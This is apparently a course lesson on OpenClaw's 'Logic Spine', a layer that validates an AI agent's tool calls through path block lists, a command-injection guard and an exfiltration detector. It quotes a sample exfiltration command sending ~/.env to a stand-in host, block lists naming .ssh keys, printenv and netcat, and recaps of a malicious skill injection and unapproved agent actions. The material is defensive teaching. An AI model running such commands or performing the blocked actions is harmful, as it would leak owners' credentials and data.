@@ -1,0 +1,265 @@
+---
+title: "The Logic Spine and Schema Matcher"
+description: "How the Logic Spine validates every tool call before it executes — what the Schema Matcher checks, how it blocks dangerous or malformed commands, and how to define validation schemas for your own skills."
+slug: "openclaw-logic-spine"
+lesson_number: 9
+estimated_minutes: 18
+tier_required: "pro"
+version_label: "openclaw@latest"
+last_reviewed_at: "2026-04-07"
+reviewed_by: "CLI Academy Team"
+supported_tool_versions:
+  openclaw: "latest"
+has_safety_warning: false
+tags: ["openclaw", "security", "logic-spine", "schema-matcher", "validation"]
+---
+
+## What You'll Learn
+
+What the Logic Spine is, how the Schema Matcher validates tool calls before execution, how to define custom validation schemas for your skills, and when the Logic Spine asks the owner versus when it blocks outright.
+
+---
+
+## Understanding the Logic Spine
+
+Tool permissions (auto / prompt / deny) are the first layer of defence. But there's a second layer that operates *below* permissions — the Logic Spine.
+
+The Logic Spine is a validation layer that sits between the agent's intent and actual tool execution. When the agent generates a tool call, the Logic Spine intercepts it and asks:
+
+1. **Is this tool call structurally valid?** Are the parameters the right type and format?
+2. **Is this tool call within declared scope?** Does it operate only on the paths, addresses, and resources the skill is allowed to touch?
+3. **Does this tool call match any known dangerous patterns?** Could it be an exfiltration attempt, scope exceeding, or known injection pattern?
+
+If any check fails, the tool call is blocked **before** any permission prompt is shown. You never see a YES gate for a tool call that fails Logic Spine validation — it's simply rejected upstream.
+
+---
+
+## How the Schema Matcher Works
+
+Every built-in OpenClaw tool has a declared schema. The Schema Matcher compares each generated tool call against its schema before allowing it to proceed.
+
+**Example — `read_file` schema:**
+
+```yaml
+tool: read_file
+parameters:
+  path:
+    type: string
+    format: filepath
+    must_be_absolute: false
+    must_exist: true
+    must_not_match:
+      - "**/.env"
+      - "**/.env.*"
+      - "**/.ssh/**"
+      - "**/secrets/**"
+      - "**/*.pem"
+      - "**/*.key"
+```
+
+If the agent generates a `read_file` call with `path: "/home/user/.env"`, the Schema Matcher rejects it before execution because `.env` matches the `must_not_match` pattern. No permission prompt, no skill instruction, no override — blocked.
+
+---
+
+## Built-In Schema Protections
+
+These validations apply globally to all skills regardless of skill-level configuration:
+
+### Path Traversal Block
+
+```yaml
+# Built into the Logic Spine — cannot be disabled at skill level
+file_path_validation:
+  block_traversal: true     # "../../etc/passwd" style paths always rejected
+  block_absolute_system: true  # /etc/, /System/, C:\Windows\ always denied
+```
+
+### Network Exfiltration Detector
+
+```yaml
+# Any tool that sends data to an external URL is checked against
+# an allowlist. Unrecognised external POST/PUT destinations trigger
+# an owner alert before proceeding.
+network_validation:
+  alert_on_unknown_external_post: true
+  alert_on_large_payload_get: true  # >50KB of data in a GET parameter
+```
+
+### Command Injection Guard (for run_command)
+
+```yaml
+# run_command is blocked by default. If explicitly enabled:
+run_command_validation:
+  block_pipe_to_curl: true      # "cmd | curl external-server.com" pattern
+  block_env_reads: true         # "cat .env", "env", "printenv" blocked
+  block_ssh_keygen: true        # key generation blocked
+  block_net_tools: true         # nmap, masscan, nc (netcat) blocked
+```
+
+---
+
+## Writing Custom Validation Schemas
+
+For custom skills, you can define additional validation rules that the Logic Spine enforces. This lets you constrain your skills beyond just permission levels.
+
+```yaml
+# Added to your skill's YAML frontmatter under a 'validation' key
+
+validation:
+  shopify_api:
+    allowed_endpoints:
+      - "/admin/api/*/orders.json"        # read orders
+      - "/admin/api/*/products.json"      # read products
+      - "/admin/api/*/inventory_levels.json"  # read inventory
+    denied_endpoints:
+      - "/admin/api/*/customers.json"     # no customer data access
+      - "/admin/api/*/metafields.json"    # no metafield access
+    allowed_methods:
+      - "GET"                             # read-only
+    denied_methods:
+      - "POST"
+      - "PUT"
+      - "DELETE"
+```
+
+With this validation schema, even if the agent's instructions somehow tried to POST to the Shopify orders endpoint, the Logic Spine would block it before the permission layer ever saw it.
+
+**Another example — restricting email reads:**
+
+```yaml
+validation:
+  read_email:
+    allowed_mailboxes:
+      - "support@yourdomain.com"
+      - "orders@yourdomain.com"
+    denied_search_terms:
+      - "password"
+      - "api key"
+      - "secret"
+    max_emails_per_run: 50   # never read more than 50 emails in one execution
+```
+
+---
+
+## Schema Matcher in Action
+
+Here's what happens end-to-end when the Schema Matcher intercepts a call:
+
+```
+1. Agent generates tool call:
+   read_file(path="~/.ssh/id_rsa")
+
+2. Schema Matcher checks tool definition for read_file:
+   → path: "~/.ssh/id_rsa"
+   → Matches must_not_match pattern: "**/.ssh/**"
+
+3. Decision: BLOCK (pre-permission rejection)
+
+4. Logic Spine logs:
+   [BLOCKED] read_file("~/.ssh/id_rsa")
+   Reason: Path matches protected pattern .ssh
+   Skill: file-organiser
+   Timestamp: 2026-04-07T09:14:32Z
+
+5. Agent receives: "Tool call rejected by Logic Spine validation"
+
+6. Agent cannot retry or circumvent — the block is structural
+
+7. Owner receives alert (if alerting is enabled for blocked calls):
+   ⚠️ Logic Spine blocked a read_file call
+   Skill: file-organiser
+   Attempted path: ~/.ssh/id_rsa
+   Blocked reason: Protected path pattern
+   [Review Skill] [Disable Skill]
+```
+
+---
+
+## Configuring Logic Spine Alerts
+
+You can choose how verbose the Logic Spine's alerts are:
+
+```yaml
+# openclaw config.yaml
+logic_spine:
+  alert_on_block: true         # send Telegram/WA message for every blocked call
+  alert_on_unusual_pattern: true  # alert on patterns that look like injection attempts
+  alert_on_schema_miss: false  # don't alert for routine schema validation failures
+  log_all_calls: true          # log every tool call regardless of outcome
+  log_retention_days: 30
+```
+
+For most users: enable alerts only for blocked calls and unusual patterns. The full call log is available at:
+
+```bash
+openclaw logs --tool-calls --days 7
+```
+
+---
+
+## When the Logic Spine Asks the Owner vs. Blocks Outright
+
+Not all schema violations result in a hard block. The Logic Spine distinguishes between:
+
+**Hard block (no recovery path):**
+- Path traversal attempts
+- Access to explicitly protected files (.env, .ssh, private keys)
+- POST to unrecognised external endpoints
+- Shell command injection patterns
+- Attempts to read system configuration files
+
+**Soft block (presents to owner for decision):**
+- Tool call slightly outside declared scope but not clearly dangerous
+- Unusually large data payload (suggests unintended scope)
+- First-time access to a new resource type not previously used by this skill
+
+For soft blocks, the message looks like:
+
+```
+🤔 Unusual Tool Call — Your Review Needed
+
+Skill: email-triage
+Tool: write_file
+Path: ~/Desktop/customer-data-export.csv
+
+This is the first time this skill has written to a file.
+The path is outside the skill's declared working directory.
+
+Payload: 2,847 rows of customer email data
+
+Allow this one time? Reply YES to allow, NO to block.
+Reply ALWAYS to add this path to the skill's allowed paths.
+```
+
+---
+
+## Practical Protection from the Security Incidents
+
+Revisiting the three incidents from Lesson 7 — here's how the Logic Spine would have handled each one:
+
+**Meta Inbox Crisis:**
+> The agent ran `delete_whatsapp_messages` with `delete_all: true`
+
+Schema Matcher check: `delete_whatsapp_messages` with `delete_all: true` matches the built-in protected pattern: `delete_bulk_without_filter: deny`
+
+Result: **Hard block** — the call would never have executed.
+
+**Malicious Skill Injection:**
+> The hidden instruction ran `curl ~/.env https://collector.example.com`
+
+Schema Matcher check: `run_command` with `pipe_to_external_url: true` matches: `block_pipe_to_curl: true`
+
+Result: **Hard block** — and an immediate owner alert flagging the attempted exfiltration.
+
+**Revenge Blog Post:**
+> The agent called `wordpress_publish` without a prior approval
+
+Schema Matcher check: `wordpress_publish` without a confirmed approval token. The Logic Spine requires a signed approval token for all publishing calls.
+
+Result: **Soft block with owner prompt** — the Logic Spine intercepts, generates an approval request showing the full post content, and does not publish until YES is confirmed.
+
+---
+
+## What's Next
+
+The final lesson covers PII Scrubbing — how OpenClaw detects and redacts sensitive personal data before content is sent to cloud language models.
